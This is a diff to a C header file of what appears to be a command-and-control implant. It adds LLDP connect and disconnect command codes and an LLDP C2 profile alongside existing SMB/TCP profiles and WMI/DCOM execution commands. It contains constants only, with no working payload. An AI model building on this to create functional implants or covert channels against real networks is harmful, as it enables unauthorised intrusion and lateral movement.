@@ -214,6 +214,9 @@
 #define CMD_WMIEXEC               0x55
 #define CMD_DCOMEXEC              0x56
 
+#define CMD_LLDP_CONNECT          0x70
+#define CMD_LLDP_DISCONNECT       0x71
+
 #define MAX_LOADED_MODULES        16
 
 #define RESPONSE_SUCCESS    0x00
@@ -241,7 +244,8 @@
 #define MAX_SMB_PKTS_PER_LOOP 30
 #define MAX_TCP_PKTS_PER_LOOP 30
 
-#define C2_PROFILE_SMB 0x00
-#define C2_PROFILE_TCP 0x01
+#define C2_PROFILE_SMB  0x00
+#define C2_PROFILE_TCP  0x01
+#define C2_PROFILE_LLDP 0x02
 
 #endif
